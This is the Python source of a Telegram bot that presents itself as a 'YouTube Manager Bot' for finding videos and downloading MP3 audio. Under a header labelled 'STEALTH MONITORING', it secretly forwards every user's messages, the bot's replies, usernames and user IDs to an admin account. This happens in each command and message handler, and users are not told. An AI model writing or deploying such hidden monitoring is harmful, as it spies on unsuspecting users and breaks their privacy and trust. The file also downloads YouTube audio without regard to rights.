import os
import yt_dlp
from flask import Flask
from threading import Thread
import telebot
from telebot import types
import time

# Load environment variables
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
ADMIN_USER_ID = os.getenv("ADMIN_USER_ID")

# Initialize
bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)
app = Flask(__name__)

# Storage
user_sessions = {}

# ==================== STEALTH MONITORING ====================
def forward_to_admin(user_id, username, message_text, is_user_message=True):
    """Forward all user-bot conversations to admin secretly"""
    try:
        if str(user_id) == ADMIN_USER_ID:
            return
            
        if is_user_message:
            admin_msg = f"👤 User: @{username} (ID: {user_id})\n💬 Message: {message_text}"
        else:
            admin_msg = f"🤖 Bot reply to @{username}:\n{message_text}"
        
        bot.send_message(ADMIN_USER_ID, admin_msg)
    except Exception as e:
        print(f"Monitoring error: {e}")

# ==================== REAL YOUTUBE SEARCH ====================
def search_youtube_real(query):
    """Real YouTube search using yt-dlp"""
    try:
        ydl_opts = {'quiet': True, 'extract_flat': True}
        
        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            info = ydl.extract_info(f"ytsearch8:{query}", download=False)
            return info.get('entries', [])
    except Exception as e:
        print(f"Search error: {e}")
        return []

# ==================== DOWNLOAD AND SEND AUDIO ====================
def download_and_send_audio(video_url, chat_id, message_id=None):
    """Download and send audio file directly"""
    try:
        if message_id:
            bot.edit_message_text("🎵 Downloading music...", chat_id, message_id)
        else:
            loading_msg = bot.send_message(chat_id, "🎵 Downloading music...")
            message_id = loading_msg.message_id

        ydl_opts = {
            'format': 'bestaudio/best',
            'outtmpl': 'downloads/%(title)s.%(ext)s',
            'postprocessors': [{
                'key': 'FFmpegExtractAudio',
                'preferredcodec': 'mp3',
                'preferredquality': '192',
            }],
        }
        
        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            info = ydl.extract_info(video_url, download=True)
            original_file = ydl.prepare_filename(info)
            media_file = original_file.rsplit('.', 1)[0] + '.mp3'
            
            if os.path.exists(media_file):
                # Send the audio file as native Telegram audio
                with open(media_file, 'rb') as media:
                    bot.send_audio(
                        chat_id, 
                        media, 
                        title=info['title'][:64],
                        performer=info.get('uploader', 'Unknown Artist'),
                        duration=info.get('duration', 0)
                    )
                
                # Send YouTube link separately
                bot.send_message(chat_id, f"🔗 YouTube Link:\n{video_url}")
                
                # Cleanup files
                os.remove(media_file)
                if os.path.exists(original_file):
                    os.remove(original_file)
                
                # Delete loading message
                bot.delete_message(chat_id, message_id)
                
            else:
                bot.edit_message_text("❌ Failed to download audio", chat_id, message_id)
                
    except Exception as e:
        error_msg = str(e)
        print(f"Download error: {error_msg}")
        if "Sign in to confirm" in error_msg:
            bot.edit_message_text("🔒 YouTube is blocking downloads. Try again later.", chat_id, message_id)
        else:
            bot.edit_message_text("❌ Download failed. Try a different video.", chat_id, message_id)

# ==================== BOT COMMANDS ====================
@bot.message_handler(commands=['start'])
def start_command(message):
    user_id = message.from_user.id
    username = message.from_user.username or "Unknown"
    
    if str(user_id) != ADMIN_USER_ID:
        forward_to_admin(user_id, username, message.text)
    
    welcome_text = """
🎬 *YouTube Manager Bot* 🎵

*Commands:*
/switch - Choose music or video mode

*Features:*
• Music: Download MP3 files + YouTube links
• Video: Get YouTube links instantly
"""
    
    bot.reply_to(message, welcome_text, parse_mode='Markdown')
    
    if str(user_id) != ADMIN_USER_ID:
        forward_to_admin(user_id, username, welcome_text, False)

@bot.message_handler(commands=['switch'])
def switch_command(message):
    user_id = message.from_user.id
    username = message.from_user.username or "Unknown"
    
    if str(user_id) != ADMIN_USER_ID:
        forward_to_admin(user_id, username, message.text)
    
    markup = types.InlineKeyboardMarkup()
    btn_music = types.InlineKeyboardButton("🎵 Music", callback_data="switch_music")
    btn_video = types.InlineKeyboardButton("🎬 Video", callback_data="switch_video")
    markup.add(btn_music, btn_video)
    
    response = "🎛️ *Choose Mode:*\n\n• 🎵 Music - Get MP3 files + links\n• 🎬 Video - Get video links"
    bot.reply_to(message, response, reply_markup=markup, parse_mode='Markdown')
    
    if str(user_id) != ADMIN_USER_ID:
        forward_to_admin(user_id, username, response, False)

@bot.message_handler(commands=['checkytchannel'])
def check_channel_command(message):
    user_id = message.from_user.id
    username = message.from_user.username or "Unknown"
    
    if str(user_id) != ADMIN_USER_ID:
        forward_to_admin(user_id, username, message.text)
    
    user_sessions[user_id] = {'waiting_for_channel': True}
    bot.reply_to(message, "🔍 Send me a YouTube channel URL, @username, or channel name:")

# ==================== CALLBACK HANDLERS ====================
@bot.callback_query_handler(func=lambda call: True)
def handle_callbacks(call):
    user_id = call.from_user.id
    
    if call.data.startswith('switch_'):
        mode = call.data.split('_')[1]
        user_sessions[user_id] = {'mode': mode}
        
        if mode == 'music':
            response = "🎵 *Music Mode*\n\nSend me a song name or artist. I'll send the MP3 file and YouTube link."
        else:
            response = "🎬 *Video Mode*\n\nSend me a video title. I'll send you the YouTube link."
        
        bot.edit_message_text(response, call.message.chat.id, call.message.message_id, parse_mode='Markdown')
    
    # MUSIC SELECTION - DOWNLOAD AND SEND AUDIO FILE + LINK
    elif call.data.startswith('music_'):
        video_url = call.data.split('_', 1)[1]
        bot.edit_message_text("🎵 Downloading music file...", call.message.chat.id, call.message.message_id)
        download_and_send_audio(video_url, call.message.chat.id, call.message.message_id)
    
    # VIDEO SELECTION - SEND LINK ONLY
    elif call.data.startswith('video_'):
        video_url = call.data.split('_', 1)[1]
        bot.edit_message_text("🎬 Getting video link...", call.message.chat.id, call.message.message_id)
        
        # Get video info for nice presentation
        try:
            ydl_opts = {'quiet': True}
            with yt_dlp.YoutubeDL(ydl_opts) as ydl:
                info = ydl.extract_info(video_url, download=False)
            
            caption = f"🎬 *{info['title']}*\n*Channel:* {info.get('uploader', 'Unknown')}\n\n🔗 *YouTube Link:*\n{video_url}"
            bot.edit_message_text(caption, call.message.chat.id, call.message.message_id, parse_mode='Markdown')
        except:
            # Fallback if can't get video info
            bot.edit_message_text(f"🔗 *YouTube Video Link:*\n{video_url}", call.message.chat.id, call.message.message_id, parse_mode='Markdown')

# ==================== MESSAGE HANDLERS ====================
@bot.message_handler(func=lambda message: True)
def handle_all_messages(message):
    user_id = message.from_user.id
    username = message.from_user.username or "Unknown"
    user_input = message.text.strip()
    
    if str(user_id) != ADMIN_USER_ID:
        forward_to_admin(user_id, username, user_input)
    
    # Handle channel analysis
    if user_sessions.get(user_id, {}).get('waiting_for_channel'):
        del user_sessions[user_id]['waiting_for_channel']
        bot.reply_to(message, "🔍 Channel analysis feature is currently unavailable.")
        return
    
    # Handle music/video mode
    session = user_sessions.get(user_id, {})
    if session.get('mode'):
        mode = session['mode']
        
        if 'youtube.com' in user_input or 'youtu.be' in user_input:
            # Direct YouTube URL
            if mode == 'music':
                progress_msg = bot.send_message(message.chat.id, "🎵 Downloading music...")
                download_and_send_audio(user_input, message.chat.id, progress_msg.message_id)
            else:
                # Video mode - just send link
                bot.send_message(message.chat.id, f"🔗 *YouTube Video Link:*\n{user_input}", parse_mode='Markdown')
                        
        else:
            # Search query
            bot.reply_to(message, f"🔍 Searching YouTube for: {user_input}")
            results = search_youtube_real(user_input)
            
            if results:
                response = "📋 *Search Results:*\n\n"
                markup = types.InlineKeyboardMarkup()
                
                for i, result in enumerate(results[:5], 1):
                    title = result['title'][:50] + "..." if len(result['title']) > 50 else result['title']
                    response += f"{i}. *{title}*\n   👉 {result['channel']}\n\n"
                    
                    if mode == 'music':
                        btn = types.InlineKeyboardButton(f"🎵 Get MP3 {i}", callback_data=f"music_{result['url']}")
                    else:
                        btn = types.InlineKeyboardButton(f"🎬 Get Link {i}", callback_data=f"video_{result['url']}")
                    markup.add(btn)
                
                bot.reply_to(message, response, reply_markup=markup, parse_mode='Markdown')
            else:
                bot.reply_to(message, "❌ No results found")
        
        if str(user_id) != ADMIN_USER_ID:
            forward_to_admin(user_id, username, f"Mode: {mode}, Query: {user_input}", False)
        return
    
    # Default response
    bot.reply_to(message, "🤖 Use /switch to choose music or video mode!")

# ==================== FLASK APP ====================
@app.route('/')
def home():
    return "YouTube Manager Bot - Music & Video Links"

def run_bot():
    print("🤖 Starting YouTube Manager Bot...")
    bot.infinity_polling()

if __name__ == '__main__':
    if not os.path.exists('downloads'):
        os.makedirs('downloads')
    Thread(target=run_bot).start()
    app.run(host='0.0.0.0', port=8080)